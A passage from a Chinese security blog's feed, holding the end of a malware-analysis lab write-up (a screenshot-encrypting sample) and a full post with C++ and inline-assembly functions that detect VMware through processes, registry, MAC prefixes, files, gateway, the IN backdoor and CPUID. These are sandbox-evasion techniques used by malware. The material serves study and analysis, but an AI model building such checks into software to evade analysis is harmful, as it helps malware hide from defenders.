src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/14.png"></p><h3 id="8-恶意代码中，你是否在Base64加密数据中看到了填充字符（-或者-）？"><a href="#8-恶意代码中，你是否在Base64加密数据中看到了填充字符（-或者-）？" class="headerlink" title="8.恶意代码中，你是否在Base64加密数据中看到了填充字符（=或者==）？"></a>8.恶意代码中，你是否在Base64加密数据中看到了填充字符（=或者==）？</h3><p>并没有看到填充的字符，因为我这里主机名正好为12位，根据base64编码的特性可以知道，是每三位变为四位，所以12位刚好扩充为16位无需填充，但是如果主机名不足12位，且其不能被3整除，就会出现填充字符。</p><h3 id="9-这个恶意代码做了什么？"><a href="#9-这个恶意代码做了什么？" class="headerlink" title="9.这个恶意代码做了什么？"></a>9.这个恶意代码做了什么？</h3><p>从资源节解密出一个域名，然后通过base64加密主机名，再和域名拼接形成一个URL，访问此URL，直到返回一个特定数据才会结束。</p><h2 id="Lab-13-2"><a href="#Lab-13-2" class="headerlink" title="Lab 13-2"></a>Lab 13-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用火绒剑，可以看到有创建文件的行为，每隔一小会就会创建一个看起来是随机名称的文件。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-1.png"></p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-2.png"></p><p>使用IDA插件FindCrypt查找是否存在加密，没有找到</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-3.png"></p><p>查看主函数，看到流程很短，while循环是一个死循环，其中有两个sleep函数，还有一个<code>sub_401851</code>函数，根据火绒剑的结果分析，隔一段时间创建文件应该就是sleep函数的原因。那么这个函数应该就是创建文件的函数。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-4.png"></p><p>查看此函数，可以看到其中有一个<code>GetTickCount</code>函数，此函数获取自系统启动以来的毫秒数，然后将其拼接成为文件名tempXXX，这就解释了刚才看到那些文件名是怎么回事了。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-5.png"></p><p>看<code>sub_401070</code>函数，这是一个生成当前的屏幕截图的函数，在其中进行截图操作。</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-6.png"></p><p>而<code>sub_40181F</code>函数就是加密的函数，查看其传入的参数也是内容和大小</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-7.png"></p><p>现在尝试在加密之前将图像内容给dump出来，在加密函数之前可以看到传入的参数分别是要加密的内容和大小</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-8.png"></p><p>在lordpe中转存这部分区域，之后改为BMP格式即可看到图片，确实是当前的截图</p><p><img src="/2021/10/08/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C13/2-9.png"></p><h3 id="1-使用动态分析，确定恶意代码创建了什么？"><a href="#1-使用动态分析，确定恶意代码创建了什么？" class="headerlink" title="1.使用动态分析，确定恶意代码创建了什么？"></a>1.使用动态分析，确定恶意代码创建了什么？</h3><p>每隔一会会创建一个tempXXX文件</p><h3 id="2-使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？"><a href="#2-使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？" class="headerlink" title="2.使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？"></a>2.使用静态分析技术，例如xor搜索指令、FindCrypt2、KANAL以及IDA熵插件，查找潜在的加密，你发现了什么？</h3><p>没有找到很有用的东西</p><h3 id="3-基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？"><a href="#3-基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？" class="headerlink" title="3.基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？"></a>3.基于问题1的回答，哪些导入函数将是寻找加密函数比较好的一个证据？</h3><p>CreateFile和WriteFile</p><h3 id="4-加密函数在反汇编的何处？"><a href="#4-加密函数在反汇编的何处？" class="headerlink" title="4.加密函数在反汇编的何处？"></a>4.加密函数在反汇编的何处？</h3><p>40181F</p><h3 id="5-从加密函数追溯原始的加密内容，原始加密内容是什么？"><a href="#5-从加密函数追溯原始的加密内容，原始加密内容是什么？" class="headerlink" title="5.从加密函数追溯原始的加密内容，原始加密内容是什么？"></a>5.从加密函数追溯原始的加密内容，原始加密内容是什么？</h3><p>原始的加密内容是屏幕截图</p><h3 id="6-你是否能够找到加密算法？如果没有，你如何解密这些内容？"><a href="#6-你是否能够找到加密算法？如果没有，你如何解密这些内容？" class="headerlink" title="6.你是否能够找到加密算法？如果没有，你如何解密这些内容？"></a>6.你是否能够找到加密算法？如果没有，你如何解密这些内容？</h3><p>加密算法就在<code>40181F</code>中，可以在加密之前将内容dump出来</p><h3 id="7-使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？"><a href="#7-使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？" class="headerlink" title="7.使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？"></a>7.使用解密工具，你是否能够恢复加密文件中的一个文件到原始文件？</h3><p>如详细分析中所述，那样操作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-13-1&quot;&gt;&lt;a href=&quot;#Lab-13-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 13-1&quot;&gt;&lt;/a&gt;Lab 13-1&lt;/h2&gt;&lt;h3 id=&quot;详细分析&quot;&gt;&lt;a href=&quot;#详细分析&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>虚拟机检测</title>
    <link href="https://b1ackie.cn/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"/>
    <id>https://b1ackie.cn/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/</id>
    <published>2021-09-28T02:14:54.000Z</published>
    <updated>2021-09-30T02:21:01.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在虚拟机的应用是越来越广泛了，不论是现在流行的网游还是一些病毒都会有自己的反虚拟机机制，判断其是否是运行在虚拟机之中。我现在也学习并记录一下一些虚拟机检测的手段，因为我只使用过VMware，所以我这里只记录自己对于VMware的检测，其他类型的虚拟机暂时没有用过，所以先暂且不提。</p><p>我个人对于虚拟机检测的理解，就是检测其中的各种特征，因为虚拟机运行和真实环境是有差距的，比如一些特定的服务，硬件名称等。</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>在虚拟机中运行的时候，是有特定的进程的，比如图中两个进程</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/1.png"></p><p>这时就可以编写代码去检测是否存在指定的进程。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">IfProcExist</span><span class="hljs-params">(WCHAR* Procname)</span></span><br><span class="hljs-function"></span>&#123;<br>PROCESSENTRY32 pe32 = &#123; <span class="hljs-number">0</span> &#125;;<br>pe32.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(PROCESSENTRY32);<br>HANDLE hSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<span class="hljs-comment">//拍摄快照</span><br>BOOL flag = <span class="hljs-built_in">Process32First</span>(hSnap, &amp;pe32);<br><span class="hljs-keyword">while</span> (flag)<br>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">wcscmp</span>(Procname, pe32.szExeFile))<span class="hljs-comment">//判断是否是指定进程</span><br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//找到返回TRUE</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>flag = <span class="hljs-built_in">Process32Next</span>(hSnap, &amp;pe32);<span class="hljs-comment">//没有找到搜索下一个</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<span class="hljs-comment">//没有找到，不存在指定进程，返回FALSE</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>当在虚拟机运行时，检测到存在指定的进程</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/2.png"></p><p>不过这两个进程都是vmtool的进程，当我把vmtool卸载之后，就没有这两个进程了。所以如果在一个没有vmtool的环境中，可能还需要去寻找其他的一些特征来进行检测。</p><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>虚拟机环境中也有许多的标志是虚拟机的注册表，可以通过查询这些注册表来判断是否处在虚拟环境之中。</p><p>比如HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Drivers这个表项</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/3.png"></p><p>可以通过尝试打开此表项，判断是否存在来作为判断依据。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">OpenReg</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HKEY hKey;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">L&quot;SOFTWARE\\VMware, Inc.\\VMware Drivers&quot;</span>, <span class="hljs-number">0</span>, KEY_ALL_ACCESS, &amp;hKey) != ERROR_SUCCESS)<span class="hljs-comment">//是否能打开此表项</span><br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<span class="hljs-comment">//打不开返回FALSE</span><br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//打开返回TRUE</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/4.png"></p><p>同时经过我测试发现，此表项也是vmtool的表项，如果卸载掉vmtool的话，此表项就不存在了。不过可用于判断的注册表项有许多，可以自己进行搜索并且实验来进行判断。我这里找到了如图的这个表项，应该是bios信息。那么可以根据这个来进行判断，比如查询SystemManufacturer中的值是否是<code>VMware, Inc.</code>来判断是否是虚拟机。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/5.png"></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckRegValue</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HKEY hKey;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">L&quot;HARDWARE\\DESCRIPTION\\System\\BIOS&quot;</span>, <span class="hljs-number">0</span>, KEY_ALL_ACCESS, &amp;hKey) != ERROR_SUCCESS)<span class="hljs-comment">//打开注册表</span><br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>DWORD dwType;<br>WCHAR data[<span class="hljs-number">100</span>];<br>DWORD len = <span class="hljs-number">100</span>;<br><span class="hljs-built_in">RegQueryValueEx</span>(hKey, <span class="hljs-string">L&quot;SystemManufacturer&quot;</span>, <span class="hljs-literal">NULL</span>, &amp;dwType, (BYTE*)data, &amp;len);<span class="hljs-comment">//查询键值</span><br><span class="hljs-built_in">RegCloseKey</span>(hKey);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">wcscmp</span>(data, <span class="hljs-string">L&quot;VMware, Inc.&quot;</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断键值是否相等</span><br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//相等返回TRUE，虚拟机环境</span><br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/6.png"></p><p>注册表里的信息非常的多，比如这里还有显卡的相对应信息，显卡名称，这也可以用来检测。具体的话，可以自己在虚拟机中的注册表内查找可以用于检测的特征。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/7.png"></p><h2 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h2><p>虚拟机的MAC地址是有特定的特征的，比如它们都是固定的开头</p><blockquote><p>00:50:56:XX:XX:XX<br>00:1C:14:XX:XX:XX<br>00:0C:29:XX:XX:XX<br>00:05:69:XX:XX:XX</p></blockquote><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/8.png"></p><p>那么就可以通过判断当前系统的MAC地址的开头地址来判断是否处于虚拟机之中。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckMacAddr</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ULONG ulSize = <span class="hljs-number">0</span>;<br>    PIP_ADAPTER_INFO pInfo = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取缓冲区大小</span><br>    pInfo = (PIP_ADAPTER_INFO)<span class="hljs-built_in">malloc</span>(ulSize);<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取适配器信息</span><br>    <span class="hljs-keyword">if</span> ((pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x50</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x56</span>) ||<br>        (pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x1C</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x14</span>) ||<br>        (pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x0C</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x29</span>) ||<br>        (pInfo-&gt;Address[<span class="hljs-number">0</span>] == <span class="hljs-number">0x00</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">1</span>] == <span class="hljs-number">0x05</span> &amp;&amp; pInfo-&gt;Address[<span class="hljs-number">2</span>] == <span class="hljs-number">0x69</span>))<span class="hljs-comment">//判断MAC地址前几位是否相同</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//相同返回TRUE</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="特定的文件"><a href="#特定的文件" class="headerlink" title="特定的文件"></a>特定的文件</h2><p>在虚拟机中有一些驱动文件，可以通过查询这些文件是否存在来判断。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/9.png"></p><p>也不仅仅是这些驱动的文件，可以通过自己的查找，用其他的一些文件来做特征。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">IfFileExist</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* FilePath)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (_access(FilePath, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断文件是否存在,0代表仅检查是否存在</span><br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//存在返回TRUE</span><br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/10.png"></p><h2 id="网关检测"><a href="#网关检测" class="headerlink" title="网关检测"></a>网关检测</h2><p>一般虚拟机中的网关地址如果不进行修改的话，最后一位都是2，那么可以通过检测网关地址的最后一位是否是2，来进行判断当前运行的环境。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/11.png"></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckGateway</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ULONG ulSize = <span class="hljs-number">0</span>;<br>    PIP_ADAPTER_INFO pInfo = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取缓冲区大小</span><br>    pInfo = (PIP_ADAPTER_INFO)<span class="hljs-built_in">malloc</span>(ulSize);<br>    <span class="hljs-built_in">GetAdaptersInfo</span>(pInfo, &amp;ulSize);<span class="hljs-comment">//获取适配器信息</span><br>    <span class="hljs-keyword">char</span> IP[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">sprintf</span>(IP, <span class="hljs-string">&quot;%s&quot;</span>, pInfo-&gt;GatewayList.IpAddress.String);<span class="hljs-comment">//网关的信息</span><br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(IP);<br>    <span class="hljs-keyword">char</span>* a = &amp;IP[len - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;2&quot;</span>, a) == <span class="hljs-number">0</span>)<span class="hljs-comment">//判断最后一位是否等于2</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> TRUE;<span class="hljs-comment">//相等返回TRUE</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/12.png"></p><h2 id="特权指令"><a href="#特权指令" class="headerlink" title="特权指令"></a>特权指令</h2><p>Vmware为主机与虚拟机之间提供了相互沟通的通讯机制，它使用“IN”指令来读取特定端口的数据以进行两机通讯，但由于IN指令属于特权指令，在处于保护模式下的真机上执行此指令时，除非权限允许，否则将会触发类型为“EXCEPTION_PRIV_INSTRUCTION”的异常，而在虚拟机中并不会发生异常，在指定功能号0A（获取VMware版本）的情况下，它会在EBX中返回其版本号“VMXH”，可以通过此返回值判断是否处于虚拟机中。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CheckIN</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag = FALSE;<br>__try<br>&#123;<br>__asm <br>&#123;<br>pushad<br>mov eax,<span class="hljs-string">&#x27;VMXh&#x27;</span><br><span class="hljs-keyword">xor</span> ebx,ebx<br>mov ecx,<span class="hljs-number">0x0A</span><span class="hljs-comment">//功能号0x0A</span><br>mov edx,<span class="hljs-string">&#x27;VX&#x27;</span><br>in eax,dx<br>cmp ebx,<span class="hljs-string">&#x27;VMXh&#x27;</span><span class="hljs-comment">//判断返回值是否是VMXh</span><br>je _vm<span class="hljs-comment">//是的话返回TRUE</span><br>jmp _exit<br>_vm:<br>mov eax,TRUE<br>mov flag,eax<br>_exit:<br>popad<br>&#125;<br>&#125;<br>__except (EXCEPTION_EXECUTE_HANDLER)<br>&#123;<br>flag = FALSE;<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/13.png"></p><h2 id="CPUID"><a href="#CPUID" class="headerlink" title="CPUID"></a>CPUID</h2><p>当eax=1时，运行CPUID之后，ecx中的值（转为二进制）如果最高位为1，那么就是在虚拟环境，否则不是。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CPUID</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag;<br>__asm<br>&#123;<br>pushad<br>pushfd<br>mov eax,<span class="hljs-number">1</span><br>cpuid<br><span class="hljs-keyword">and</span> ecx,<span class="hljs-number">0x80000000</span><span class="hljs-comment">//只留最高位进行判断</span><br>test ecx,ecx<span class="hljs-comment">//判断ecx寄存器是否为空，为空代表非虚拟机环境返回FALSE，否则返回TRUE</span><br>jz _Not<br>mov flag,TRUE<br>jmp _end<br>_Not:<br>mov flag,FALSE<br>_end:<br>popfd<br>popad<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/15.png"></p><p>当eax中的值是0x40000000时，ebx、ecx、edx三个寄存器中的返回值加起来正好是“VMWareVMWare”，可以把这个程序拖入OD，直接进行修改来查看。</p><p><img src="/2021/09/28/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/14.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结了一些可以使用的虚拟机检测的方式，但是感觉还是比较片面的，其中一些检测的特征也可以通过手动的方式来进行修改。</p><p>感觉反虚拟机还是游戏方面做的更好一些，如果能把网游反虚拟机的机制学习清楚的话应该还能学到更多的东西。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://blog.nsfocus.net/malicious-sample-analysis-manual-virtual-machine-test-bottom/">http://blog.nsfocus.net/malicious-sample-analysis-manual-virtual-machine-test-bottom/</a></p><p><a href="https://www.freebuf.com/articles/system/202717.html">https://www.freebuf.com/articles/system/202717.html</a></p><p><a href="https://www.write-bug.com/article/1822.html">https://www.write-bug.com/article/1822.html</a></p><p><a href="https://bbs.pediy.com/thread-219955.htm">https://bbs.pediy.com/thread-219955.htm</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;现在虚拟机的应用是越来越广泛了，不论是现在流行的网游还是一些病毒都会有自己的反虚拟机机制，判断其是否是运行在虚拟机之中。我现在也学习并记录一</summary>
      
    
    
    
    <category term="虚拟机检测" scheme="https://b1ackie.cn/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="虚拟机检测" scheme="https://b1ackie.cn/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A3%80%E6%B5%8B/"/>
    
    <category term="编程" scheme="https://b1ackie.cn/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战-实验12</title>
    <link href="https://b1ackie.cn/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/"/>
    <id>https://b1ackie.cn/2021/09/23/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C12/</id>
